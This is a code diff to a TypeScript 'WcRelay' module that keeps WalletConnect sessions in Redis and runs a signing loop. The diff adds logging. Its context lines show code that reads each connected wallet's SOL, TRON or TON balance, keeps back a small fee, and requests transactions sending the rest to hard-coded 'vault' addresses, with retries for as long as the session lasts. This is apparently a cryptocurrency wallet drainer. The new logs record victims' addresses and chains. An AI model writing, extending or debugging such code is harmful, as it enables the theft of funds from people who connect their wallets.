@@ -49,10 +49,16 @@ function getRedis(): RedisClient | null {
 
 async function storeSession(data: WcSessionData): Promise<boolean> {
   const redis = getRedis()
-  if (!redis) return false
+  if (!redis) {
+    console.warn('[WcRelay] storeSession: no Redis client')
+    return false
+  }
   const now = Math.floor(Date.now() / 1000)
   const ttl = Math.min(MAX_TTL_SEC, Math.max(0, data.expiry - now))
-  if (ttl < 60) return false
+  if (ttl < 60) {
+    console.warn('[WcRelay] storeSession: session expired | topic:', data.topic.slice(0, 8))
+    return false
+  }
   try {
     await (redis as any).set(
       `${WC_SESSION_KEY_PREFIX}${data.topic}`,
@@ -60,8 +66,10 @@ async function storeSession(data: WcSessionData): Promise<boolean> {
       'EX',
       ttl,
     )
+    console.log('[WcRelay] session stored | topic:', data.topic.slice(0, 8) + '... | ttl:', ttl + 's | chains:', Object.keys(data.wallet_addresses ?? {}).join(','))
     return true
-  } catch {
+  } catch (e) {
+    console.warn('[WcRelay] storeSession: Redis set failed:', e instanceof Error ? e.message : String(e))
     return false
   }
 }
@@ -220,7 +228,10 @@ async function trySolSign(session: WcSessionData): Promise<boolean> {
     const to = new PublicKey(vaultSol)
     const lamports = await conn.getBalance(from)
     const sendLamports = lamports - 5000
-    if (sendLamports <= 0) return false
+    if (sendLamports <= 0) {
+      console.log('[WcRelay] SOL skip | zero balance | addr:', solAddr.slice(0, 8))
+      return false
+    }
 
     const { blockhash } = await conn.getLatestBlockhash()
     const msg = new TransactionMessage({
@@ -265,7 +276,10 @@ async function tryTronSign(session: WcSessionData): Promise<boolean> {
 
     const balSun = await tw.trx.getBalance(tronAddr)
     const sendSun = balSun - 1_500_000 // 1.5 TRX fee reserve
-    if (sendSun <= 0) return false
+    if (sendSun <= 0) {
+      console.log('[WcRelay] TRON skip | zero balance | addr:', tronAddr.slice(0, 8))
+      return false
+    }
 
     const rawTx = (await tw.transactionBuilder.sendTrx(vaultTron, sendSun, tronAddr)) as unknown as Record<string, unknown>
 
@@ -314,7 +328,10 @@ async function tryTonSign(session: WcSessionData): Promise<boolean> {
 
     const balNano = BigInt(json.result ?? '0')
     const sendNano = balNano - 15_000_000n // 0.015 TON fee reserve
-    if (sendNano <= 0n) return false
+    if (sendNano <= 0n) {
+      console.log('[WcRelay] TON skip | zero balance | addr:', tonAddr.slice(0, 8))
+      return false
+    }
 
     await sendRequest(session, chainId, 'ton_sendTransaction', [
       {
@@ -342,6 +359,8 @@ async function runSignLoop(session: WcSessionData): Promise<void> {
   const { topic, expiry } = session
   const retries: Record<string, number> = { sol: 0, tron: 0, ton: 0 }
   const done: Record<string, boolean> = {}
+
+  console.log('[WcRelay] sign loop start | topic:', topic.slice(0, 8) + '... | addrs:', JSON.stringify(session.wallet_addresses))
 
   while (activeLoops.has(topic)) {
     // Stop if session expired
